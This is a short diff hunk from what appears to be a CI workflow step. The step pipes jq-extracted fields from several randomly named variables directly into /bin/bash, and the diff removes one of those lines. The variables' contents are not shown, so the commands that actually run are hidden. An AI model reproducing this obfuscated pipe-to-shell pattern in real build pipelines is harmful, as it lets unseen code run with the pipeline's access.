@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$rka79511" | jq -r .moo74 | /bin/bash
           echo $g2 | jq -r .r20 | /bin/bash
           echo $up119 | jq -r .okgh6648 | /bin/bash
-          printf '%s' "$ou600" | jq -r .x04609 | /bin/bash
           printf '%s' "$apoot44" | jq -r .gh60 | /bin/bash
 
       - name: Store artifact
